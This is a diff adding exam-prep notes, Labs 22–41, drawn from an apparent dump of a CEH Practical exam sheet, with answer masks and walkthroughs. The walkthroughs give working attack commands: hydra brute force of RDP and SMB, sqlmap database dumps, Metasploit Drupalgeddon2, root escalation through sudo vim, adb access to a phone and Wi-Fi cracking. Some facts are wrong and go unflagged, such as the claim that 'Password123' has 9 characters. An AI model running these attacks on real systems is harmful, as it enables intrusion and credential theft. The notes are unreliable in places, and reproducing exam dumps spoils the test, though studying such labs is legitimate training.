@@ -697,3 +697,487 @@ Related note from the same page: you have already registered on the website with
 5. If that row is a hash, run it through `hashid -m` → `hashcat -m <mode>` before answering; the question asks for the password, not the digest.
 
 ⇒ Answer: Sarah's password (plaintext — cracked first if the dump returns a hash).
+
+---
+
+# CEH Practical — June 2024 (20 tasks)
+
+> [!info] Source and layout of this part
+> `Examenes teoricos practicos CEH/CEH Practical June - 2024.pdf` (15 pages). Every task in it ships with an
+> **answer format mask** (`NN.N.NNNNN`, `NaaNNNaa)`, `A**NNAA`…) and a worked solution. Both are kept: the mask
+> tells you the shape of the answer before you have the value, which is half the exam technique.
+> Because that PDF already carries the walk, each task here is self-contained — text → toolbox → walk —
+> instead of the split used in Labs 01–21.
+> The PDF is a dump-style sheet from a single sitting: the values it prints are examples of what an answer
+> looks like, not guarantees. Where the sheet contradicts itself, that is called out.
+
+## Lab 22 — Product Version of the Domain Controller
+
+Perform an extensive scan of the target network and identify the Product Version of the Domain Controller.
+`Format: NN.N.NNNNN`
+
+> [!tip] Parrot toolbox
+> ```bash
+> sudo nmap -sV -p 25,80,110,143 192.168.0.0/24
+> sudo nmap --script smb-os-discovery -p 445 <DC-IP>
+> ```
+> `smb-os-discovery` prints a line of the form
+> `OS: Windows Server 2022 Datacenter 20348 (Windows 10.0 Build 20348)`.
+
+> [!example] Walk
+> 1. `-sV` over the subnet → the host with `445` open and a Windows banner is the DC.
+> 2. `smb-os-discovery` → the `OS:` line above.
+> 3. The mask `NN.N.NNNNN` is build-number shaped: two digits, dot, five digits → `10.0.20348` (the part inside the parentheses).
+>
+> ⇒ Answer: the build number matching the mask, not the marketing name ("Windows Server 2022").
+
+## Lab 23 — Number of Mercury services on the server
+
+While investigating an attack, you found that a Windows web development environment was exploited to gain
+access to the system. Perform extensive scanning and service enumeration of the target networks and identify
+the number of Mercury services running in the server. `Format: N`
+
+> [!tip] Parrot toolbox
+> ```bash
+> sudo nmap -sV -p 25,80,110,143 192.168.0.0/24
+> sudo nmap -sV -p- --open <target>
+> ```
+> Look for `Mercury/32` in the VERSION column.
+
+> [!example] Walk
+> 1. The four ports the sheet names are exactly the ones Mercury serves: `25/tcp smtp Mercury/32 smtpd`, `110/tcp pop3 Mercury/32 pop3d`, `143/tcp imap Mercury/32 imapd`.
+> 2. `80/tcp` is Apache, not Mercury — do not count it.
+> 3. Count the distinct `Mercury/32` lines → **3**.
+>
+> ⇒ Answer: `3`. One digit, matching `Format: N`.
+
+## Lab 24 — RDP + `hide.cfe` → CRC32 of the image
+
+Identify a machine with RDP service enabled in the `10.10.55.0/24` subnet. Crack the RDP credentials for user
+**Jones** and obtain a file `hide.cfe` containing an encrypted image file. Decrypt the file and enter the
+CRC32 value of the image file as the answer. Note: use Jones's password to extract the image file.
+`Format: NaaNNNaa)`
+
+> [!tip] Parrot toolbox
+> ```bash
+> sudo nmap -p 3389 --open -sV 10.10.55.0/24
+> hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.10.55.X
+> xfreerdp /v:10.10.55.X /u:Jones /p:'<pass>' /cert:ignore
+> ```
+> Then open the container with Jones's password (`7z x hide.cfe` / `openssl` / VeraCrypt — the sheet does not
+> name the container format, it only says the password opens it), extract the image, and compute CRC32.
+
+> [!example] Walk
+> 1. `nmap -p 3389 --open` narrows the subnet to the host exposing RDP.
+> 2. `hydra ... rdp://` with `-t 1` (RDP kills parallel attempts) → Jones's plaintext password.
+> 3. Log in, copy `hide.cfe` out, open it **with that same password** — the note "use Jones's password to extract" is the whole trick: no cracking of the container.
+> 4. Compute CRC32 of the extracted image. Offline on Parrot: `python3 -c "import zlib;print('%08x' % (zlib.crc32(open('img.jpg','rb').read()) & 0xffffffff))"`, or the sheet's online tool.
+> 5. Check the result against the mask `NaaNNNaa)`: digit, two letters, three digits, two letters.
+>
+> ⇒ Answer: the CRC32 in the mask's shape — CRC32 is 8 hex characters, so a mask with letters past `f` means you are looking at the *site's* formatting, not raw hex. Trust the mask.
+
+## Lab 25 — Mobile device image → hidden secret code
+
+An insider attack involving one of the employee's mobile devices in the `10.10.55.0/24` subnet has been
+identified. You are assigned to covertly access the user's device and obtain hidden data in the image file
+stored. Analyze the image file and extract the sensitive data hidden in the file and enter the secret code as
+the answer. `Format: A AaAaAN`
+
+> [!tip] Parrot toolbox
+> ```bash
+> adb connect 10.10.55.X:5555
+> adb shell
+> find /sdcard/ -name "*.jpg" -o -name "*.png"
+> adb pull /sdcard/Downloads/CEH.jpg ./ceh.jpg
+> steghide extract -sf ceh.jpg
+> cat hidden.txt
+> ```
+> `adb` over TCP/5555 is the remote path — that is why no physical access is needed.
+
+> [!example] Walk
+> 1. `adb connect` to `5555` (the ADB-over-network port the sheet gives) → shell on the phone.
+> 2. `find /sdcard/ -name "*.jpg"` → locate the candidate images; `adb pull` brings them local.
+> 3. `steghide extract -sf ceh.jpg` → passphrase prompt; try empty first, then the device/user password.
+> 4. The extraction writes `hidden.txt` → `cat` it.
+> 5. The secret must fit `A AaAaAN` (7 characters, mixed case + digit).
+>
+> ⇒ Answer: the content of `hidden.txt`, checked against the mask.
+
+## Lab 26 — OpenVAS: least severe CVE on 192.168.44.32
+
+Perform a vulnerability scan for the host with IP address `192.168.44.32`. What is the CVE number of the
+vulnerability with the **least severity** score? Credentials of OpenVAS are given. `Format: AAA NNNNNNNN`
+
+> [!tip] Parrot toolbox
+> Greenbone/OpenVAS on Parrot (`sudo gvm-start`, then `https://127.0.0.1:9392`):
+> `Configuration → Targets → New Target` (IP `192.168.44.32`) → `Scans → Tasks → New Task` → run →
+> `Scans → Reports` → open the report → sort by **severity ascending**.
+
+> [!example] Walk
+> 1. Target and task are built around the single IP the question gives — do not scan the subnet.
+> 2. In the report, the severity column is CVSS; sorting **ascending** puts the lowest score on top.
+> 3. Read the CVE id of that row: `CVE-YYYY-NNNN`.
+> 4. The mask `AAA NNNNNNNN` is literally `CVE` + year + id — it is telling you the answer is a CVE, not a score.
+>
+> ⇒ Answer: that CVE id. (Sorting descending gives you the critical one — the wrong row.)
+
+## Lab 27 — Remote login app → `Netnormal.txt`
+
+Exploit a remote login and command-line execution application on a Linux target in the `10.10.55.0/24` subnet
+to access a sensitive file `Netnormal.txt`. Enter the content in the file as the answer.
+`Format: ANaN*aNaN`
+
+> [!tip] Parrot toolbox
+> ```bash
+> sudo nmap -p 22 --open 10.10.55.0/24
+> ssh Marcus@10.10.55.X          # M3rcy@123
+> find / -type f -name Netnormal.txt 2> /dev/null
+> cat Netnormal.txt
+> ```
+> The sheet's own credential for this host is `Marcus:M3rcy@123` — no brute force needed here.
+
+> [!example] Walk
+> 1. `nmap -p 22 --open` → the Linux host with SSH is the "remote login and command-line execution application".
+> 2. `ssh Marcus@...` with the given password → shell.
+> 3. `find / -type f -name Netnormal.txt 2> /dev/null` → absolute path (the `2>` swallows permission noise).
+> 4. `cat` it and check the shape against `ANaN*aNaN` (8 chars, one symbol).
+>
+> ⇒ Answer: the file content.
+
+## Lab 28 — `restricted.txt` → 9-character credential
+
+An ex-employee has stolen a vital account credential and stored it in a file named `restricted.txt` before
+leaving the organization. The credential is a nine-character alpha-numeric string. Enter the credential as the
+answer. The file is in the "EH Workstation 2" machine, Documents folder. Note: "password" is the key to
+extracting the credential. `Format: aaaaa*NNN`
+
+> [!tip] Parrot toolbox
+> ```bash
+> cd ~/Documents
+> stegsnow -p password -C restricted.txt output.txt
+> cat output.txt
+> cat output.txt | base64 -d
+> ```
+
+> [!example] Walk
+> 1. `stegsnow -p password -C restricted.txt output.txt` — snow steganography hides data in *whitespace*, which is why `cat` shows nothing useful and why the note gives the passphrase.
+> 2. `cat output.txt` → still unreadable → the sheet says the extracted blob is base64.
+> 3. `cat output.txt | base64 -d` → the plaintext credential.
+> 4. Cross-check the length: the question says **nine** characters and the mask is `aaaaa*NNN` (5 + 1 + 3 = 9). If your decode is not 9, you decoded the wrong layer.
+>
+> ⇒ Answer: the 9-character string (the sheet's example output is `maddy@777`, which fits the mask exactly).
+
+## Lab 29 — SMB weak credentials → `Sniffer.txt`
+
+Exploit weak credentials used for SMB service on a Windows machine in the `10.10.55.0/24` subnet. Obtain the
+file `Sniffer.txt` hosted on the SMB root and enter its content as the answer. `Format: a*aaNaNNa)`
+
+> [!tip] Parrot toolbox
+> ```bash
+> sudo nmap -p 139,445 --open -sV 10.10.55.0/24
+> smbclient -L \\10.10.55.X
+> hydra -L user_list.txt -P password_list.txt 10.10.55.X smb
+> smbclient \\10.10.55.X\share_name -U user%password123
+> get Sniffer.txt
+> cat Sniffer.txt
+> ```
+> Note the syntax difference: `-L` lists shares, the UNC path connects to one.
+
+> [!example] Walk
+> 1. `nmap -p 139,445` → hosts with SMB; the one in scope is the Windows box.
+> 2. `smbclient -L` with a null/anonymous session first — if it lists shares, you skipped the brute force.
+> 3. Otherwise `hydra ... smb` against the two wordlists → `user` / `password123` (the sheet's example pair).
+> 4. Connect to the share, `get Sniffer.txt` (SMB "root" = the share root), `cat` locally.
+> 5. Check the mask `a*aaNaNNa)`.
+>
+> ⇒ Answer: the file content.
+
+## Lab 30 — Shoulder surfing Marcus → root → `imroot.txt`
+
+You used shoulder surfing to identify the username and password of a user on the Ubuntu machine in the
+`10.10.55.0/24` network, that is, **Marcus** and **M3rcy@123**. Access the target machine, perform vertical
+privilege escalation to that of a root user, and enter the content of the `imroot.txt` file as the answer.
+`Format: AANNNN***)`
+
+> [!tip] Parrot toolbox
+> ```bash
+> ssh marcus@10.10.55.X
+> sudo -l                       # look for vim, less, find, awk...
+> sudo vim -c ':!sh'            # inside vim: :!sh  or  :!bash
+> find / -name "imroot.txt" 2>/dev/null
+> cat imroot.txt
+> ```
+> `:!sh` inside a root-owned `vim` drops you to a root shell — the classic GTFOBins path.
+
+> [!example] Walk
+> 1. `ssh marcus@...` with the shoulder-surfed password → unprivileged shell.
+> 2. `sudo -l` → if it lists `/usr/bin/vim`, that is the escalation: vim can spawn a shell.
+> 3. `sudo vim` → `:!sh` → `#`. (`:!bash` also works; `sudo -i` only works if `sudo -l` allows it.)
+> 4. `find / -name "imroot.txt" 2>/dev/null` → usually `/root/imroot.txt`, readable now.
+> 5. Mask `AANNNN***)` = 2 upper + 4 digits + 3 symbols.
+>
+> ⇒ Answer: the file content.
+
+## Lab 31 — RAT → count the files in `Scan`
+
+A disgruntled ex-employee Martin has hidden some confidential files in a folder `Scan` in a Windows machine in
+the `10.10.55.0/24` subnet. You can not physically access the target machine, but the organization has installed
+a RAT for remote administration. Your task is to check how many files are present in the `Scan` folder and enter
+the number of files sniffed by the employee as answer. `Format: N`
+
+> [!tip] Parrot toolbox
+> ```bash
+> sudo nmap -p- -Pn -T4 <target>     # find the RAT's listening port
+> # then: Thief RAT client → connect to 10.10.55.X → authenticate
+> # Thief RAT → File Manager → C:\Users\<user>\Documents\Scan → count
+> ```
+
+> [!example] Walk
+> 1. The RAT is client-driven here: the sheet's route is the RAT's own file manager, not Metasploit.
+> 2. `nmap -p-` finds the non-standard port the RAT listens on; the banner identifies the family (`Thief RAT` in this sheet).
+> 3. Connect + authenticate, open `C:\Users\<user>\Documents\Scan`.
+> 4. Count the entries — files only, not the `..` row and not subfolders.
+>
+> ⇒ Answer: a single digit.
+
+## Lab 32 — `PT_LOAD 0` of the malware executable
+
+Find `PT_LOAD 0` of the malware executable file given. `Format:` not stated in the source.
+
+> [!tip] Parrot toolbox
+> GUI route (as the sheet does it): `Detect It Easy` → load the binary → **ELF** tab → program headers → first
+> entry. CLI route on Parrot, same numbers:
+> ```bash
+> readelf -l malware.elf | sed -n '/Program Headers/,/Section to Segment/p'
+> rabin2 -l malware.elf
+> ```
+
+> [!example] Walk
+> 1. `file malware.elf` → ELF, so it is a program-header question, not a PE one.
+> 2. `readelf -l` → the `LOAD` segment listed first is `PT_LOAD 0`.
+> 3. Read two fields off that row: `Offset` and `VirtAddr`. The sheet's example shows `Offset: 0x00000000`, `Virtual Addr: 0x08048000`, `Flags: R E`, `Align: 0x1000`.
+> 4. `0x08048000` is the classic 32-bit x86 base address — seeing it means you are on the first LOAD segment.
+>
+> ⇒ Answer: the `Virtual Addr` of `PT_LOAD 0` (the source gives no mask, so confirm with the exam's field label — offset and vaddr are different numbers and both are plausible answers).
+
+## Lab 33 — DDoS: least IPv4 packet count to 172.22.10.10
+
+You are investigating a massive DDoS attack launched against a target at `172.22.10.10`. Your objective is to
+identify the packets responsible for the attack and determine the **least IPv4 packet count** sent to the victim
+machine. The capture `Evil-traffic.pcapng` is in the Documents folder of the "EH Workstation 2" Windows 11
+machine. `Format: NNNNN`
+
+> [!tip] Parrot toolbox
+> ```bash
+> tshark -r Evil-traffic.pcapng -q -z conv,ip
+> tshark -r Evil-traffic.pcapng -Y 'ip.dst == 172.22.10.10' -T fields -e ip.src \
+>   | sort | uniq -c | sort -n | head
+> ```
+> Wireshark equivalent: `Statistics → Conversations → IPv4`, filter `ip.dst == 172.22.10.10`, click the
+> **Packets** column to sort.
+
+> [!example] Walk
+> 1. Load the capture, apply `ip.dst == 172.22.10.10` — the question is about traffic *to the victim*, not all traffic.
+> 2. Open IPv4 conversations; each row is one src↔dst pair with its packet count.
+> 3. Sort **ascending** this time: the question says **least** packet count, the opposite of the usual "top talker".
+> 4. Read the count of the first row that talks to the victim.
+>
+> ⇒ Answer: a 5-digit number. (Labs 19 and 33 ask the same table in opposite directions — read the word "least"/"most" every time.)
+
+## Lab 34 — `cinema.cehorg.com` → Daniel's password
+
+Perform an SQL injection attack on your target web application `cinema.cehorg.com` and extract the password of
+user **Daniel**. You have already registered on the website with credentials `Karen/computer`.
+`Format: aaaaaaaaaa)`
+
+> [!tip] Parrot toolbox
+> ```bash
+> # log in as Karen/computer, copy PHPSESSID from the cookie jar
+> sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=<id>" --dbs
+> sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=<id>" -D cinema --tables
+> sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=<id>" \
+>        -D cinema -T users -C username,password --dump
+> ```
+
+> [!example] Walk
+> 1. The `Karen/computer` account exists so you can reach the authenticated `search.php` — that is why the question mentions it.
+> 2. `--cookie` carries the session; without it sqlmap gets bounced to the login page and reports "not injectable".
+> 3. `--dbs` → `cinema`; `--tables` → `users`; `--dump` the two columns.
+> 4. Read the **Daniel** row (the sheet's dump shows `Daniel` → `qwertyuiop`, `Karen` → `computer`).
+> 5. Mask `aaaaaaaaaa)` = 10 lowercase → `qwertyuiop` fits; `computer` does not.
+>
+> ⇒ Answer: Daniel's password (the 10-character one).
+
+## Lab 35 — `page_id=95` flag
+
+Explore the web application at `www.cehorg.com` and enter the flag's value on the page with `page_id=95`.
+`Format: A**NNAA`
+
+> [!tip] Parrot toolbox
+> ```bash
+> curl -s 'http://www.cehorg.com/index.php?page_id=95'
+> curl -s 'http://www.cehorg.com/index.php?page_id=95' | grep -i -E 'flag|<!--'
+> # browser: right-click → View Page Source → Ctrl+F for the mask shape
+> ```
+> This one is source-reading, not sqlmap: the flag sits in an HTML comment.
+
+> [!example] Walk
+> 1. Open the URL with `page_id=95` — the rendered page shows nothing.
+> 2. View source / `curl` the raw HTML → the comment `<!-- The flag is A**23BC -->` is exactly what the sheet shows.
+> 3. Check it against `A**NNAA`: `A`, two symbols, two digits, two letters → `A**23BC` matches.
+>
+> ⇒ Answer: the string inside the comment. (Contrast with Lab 06, where the same parameter *was* injectable — same app family, different lab.)
+
+## Lab 36 — `training.cehorg.com` at 10.10.55.50 → Drupalgeddon2 → `Flag.txt`
+
+Perform vulnerability research and exploit the web application `training.cehorg.com`, available at
+`10.10.55.50`. Locate the `Flag.txt` file and enter its content as the answer. `Format: AaaNNN`
+
+> [!tip] Parrot toolbox
+> ```bash
+> curl -sI http://10.10.55.50 | grep -i -E 'server|x-generator'    # Drupal?
+> msfconsole -q
+> msf > search drupalgeddon2
+> msf > use exploit/unix/webapp/drupal_drupalgeddon2
+> msf > set RHOST 10.10.55.50
+> msf > set RPORT 80
+> msf > run
+> # shell:
+> find / -name Flag.txt 2>/dev/null
+> cat /path/to/Flag.txt
+> ```
+
+> [!example] Walk
+> 1. Fingerprint first: Drupal is visible in the page source (`Drupal.settings`, `X-Generator: Drupal 7`), and `searchsploit drupal` matches it to Drupalgeddon2.
+> 2. `msfconsole` → `search drupalgeddon2` → `exploit/unix/webapp/drupal_drupalgeddon2`.
+> 3. `set RHOST` / `RPORT 80` → `run` → Meterpreter/shell.
+> 4. `find / -name Flag.txt` → `cat` it. Also check the web root (`/var/www/html`) first — faster than a full `find`.
+> 5. Mask `AaaNNN` = 1 upper, 2 lower, 3 digits.
+>
+> ⇒ Answer: the file content.
+
+## Lab 37 — SQLi on `cybersec.cehorg.com` (192.168.44.40) → Flag column
+
+Perform an SQL injection attack on the web application `cybersec.cehorg.com`, available at `192.168.44.40`.
+Find the value in the Flag column in one of the DB tables and enter it as the answer. `Format: *aNNaNAA`
+
+> [!tip] Parrot toolbox
+> ```bash
+> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs
+> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D <db> --tables
+> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D <db> -T <table> --columns
+> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D <db> -T <table> -C Flag --dump
+> ```
+> `--crawl=3` is what makes this work: the URL has no visible parameter, so sqlmap has to discover one.
+
+> [!example] Walk
+> 1. `--crawl=3 --level=5 --risk=3` on the bare host → sqlmap finds injectable parameters by itself.
+> 2. `--dbs` → pick the app database; `--tables` → the table holding a `Flag` column; `--columns` confirms the name (capital `F`).
+> 3. `-C Flag --dump` → the value.
+> 4. Mask `*aNNaNAA` (8 chars, starts with a symbol) is the filter: the sheet's example output row is `1 | Secret123`.
+>
+> ⇒ Answer: the `Flag` column value.
+
+## Lab 38 — DVWA base64 files → original message
+
+A set of files has been uploaded through DVWA (`http://192.168.44.32:8080/DVWA`). The files are located in the
+`C:\wamp64\www\DVWA\ECweb\Certified\` directory. Access the files and decode the base64 ciphers to reveal the
+original message among them. Enter the decrypted message as the answer. You can log into the DVWA using the
+credentials `admin/password`. `Format: A**aaa*AA`
+
+> [!tip] Parrot toolbox
+> ```bash
+> curl -s 'http://192.168.44.32:8080/DVWA/ECweb/Certified/'           # directory listing
+> curl -s 'http://192.168.44.32:8080/DVWA/ECweb/Certified/<file>' | base64 -d
+> for f in *; do echo "== $f"; base64 -d "$f"; echo; done             # decode the whole set at once
+> ```
+> CyberChef ("From Base64") is the GUI equivalent the sheet mentions.
+
+> [!example] Walk
+> 1. The directory is web-reachable under the DVWA tree, so `curl` lists it without logging in.
+> 2. Download every file in it and `base64 -d` each one — several will decode to junk.
+> 3. One of them decodes to readable text; that is the message the question calls "the original message".
+> 4. Mask `A**aaa*AA` (9 chars: upper, 2 symbols, 3 lower, symbol, 2 upper) picks it out of the noise.
+>
+> ⇒ Answer: the decoded message, not the base64 blob.
+
+## Lab 39 — IoT publish message → topic length
+
+Analyze the traffic capture from an IoT network located in the Documents folder of the "EH Workstation 1"
+(ParrotSecurity) machine, identify the packet with IoT Publish Message, and enter the **topic length** as the
+answer. `Format: N`
+
+> [!tip] Parrot toolbox
+> ```bash
+> tshark -r IoT_traffic_capture.pcapng -Y 'mqtt.msgtype == 3' \
+>   -T fields -e frame.number -e mqtt.topic -e mqtt.len
+> ```
+> Wireshark: display filter `mqtt.msgtype == 3`, then read the **Topic** field of a PUBLISH packet.
+
+> [!warning] The sheet contradicts itself here
+> It says "a topic length of 9 characters, such as `sensors/temperature`, then the answer would be 9" — but
+> `sensors/temperature` is 19 characters. The prose is wrong; the **field** is right. Count the characters of
+> the topic string you actually see (`sensors/temperature` → 19, not 9).
+
+> [!example] Walk
+> 1. `mqtt.msgtype == 3` = PUBLISH (1 CONNECT, 2 CONNACK, 3 PUBLISH, 4 PUBACK…).
+> 2. Each PUBLISH row carries a topic; the topic length is the string length in characters.
+> 3. If the capture has several topics, use the format mask `N` (a single digit) to pick the one that can be a one-digit length — i.e. a very short topic like `sensor` or `temp`.
+> 4. Do not confuse topic length with payload length (`mqtt.len`) — Lab 17 asks for that one.
+>
+> ⇒ Answer: the character count of the topic.
+
+## Lab 40 — VeraCrypt `Its_File` + `Hash2crack.txt` → `EC_data.txt`
+
+A disgruntled employee has stolen the company's trade secrets and encrypted them using VeraCrypt. The volume
+file `Its_File` is on the C: drive of the "EH Workstation 2" machine. The password is hashed in
+`Hash2crack.txt` in the Documents folder of the "EH Workstation 1" (ParrotSecurity) machine. Decrypt the hash,
+access the volume, and find the secret code in the file `EC_data.txt`. `Format: NA*aNaa**A`
+
+> [!tip] Parrot toolbox
+> ```bash
+> hashid -m "$(cat Hash2crack.txt)"
+> john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt Hash2crack.txt
+> hashcat -m 0 Hash2crack.txt /usr/share/wordlists/rockyou.txt
+> sudo veracrypt -t --mount Its_File /mnt/vc --password='<plain>' --pim=0 --protect-hidden=no
+> cat /mnt/vc/EC_data.txt
+> sudo veracrypt -t -d /mnt/vc
+> ```
+
+> [!example] Walk
+> 1. `hashid -m` first: the sheet cracks it as `Raw-MD5` (`-m 0`), which means it is the *volume password* hashed as a plain MD5 — not a Veracrypt header hash.
+> 2. `john --format=Raw-MD5 --wordlist=rockyou.txt` → the plaintext password.
+> 3. Mount `Its_File` with that password, `--pim=0` (default) and `--protect-hidden=no`.
+> 4. `cat /mnt/vc/EC_data.txt` → the secret code; unmount after.
+> 5. Mask `NA*aNaa**A` = 10 characters, digit + upper, symbol, lower, digit + 2 lower, 2 symbols + upper.
+>
+> ⇒ Answer: the code in `EC_data.txt` (the sheet's example is `Confidential789`; its length does **not** fit the mask, so treat that value as illustrative only).
+
+## Lab 41 — Rogue AP `W!F!_Pcap.cap` → password length
+
+Your organization suspects the presence of a rogue AP in the vicinity. You are tasked with cracking the wireless
+encryption, connecting to the network, and setting up a honeypot. The capture `W!F!_Pcap.cap` is in the Documents
+folder of the "EH Workstation 1" (ParrotSecurity) machine. Crack the wireless encryption and enter the **total
+number of characters** in the Wi-Fi password. `Format: N`
+
+> [!tip] Parrot toolbox
+> ```bash
+> aircrack-ng W!F!_Pcap.cap                       # does it hold a handshake?
+> aircrack-ng -w /usr/share/wordlists/rockyou.txt W!F!_Pcap.cap
+> airodump-ng W!F!_Pcap.cap                       # BSSID + channel, if you need to re-capture
+> ```
+
+> [!example] Walk
+> 1. `aircrack-ng` on the `.cap` with no wordlist → it reports the networks and whether a handshake is present.
+> 2. Run it with `rockyou.txt` → `KEY FOUND! [ <passphrase> ]`.
+> 3. Count the characters of that passphrase — the question asks for the **length**, not the password.
+> 4. The sheet's example is `Password123` → `9`.
+> 5. Honeypot half (`airbase-ng -e '<ssid>' -c <ch> wlan0mon` or `wifiphisher`) is a separate deliverable and does not produce this answer.
+>
+> ⇒ Answer: the character count (single digit).
+
+> [!note] What changed in this part
+> 20 new labs (22–41) from the June 2024 sheet. Two of its own statements are flagged as unreliable:
+> the IoT "topic length of 9, such as `sensors/temperature`" claim (Lab 39) and the `Confidential789`
+> example (Lab 40, wrong length for the mask). Everything else is the sheet's method, restated with the
+> Parrot-side equivalent where it used a Windows GUI tool.
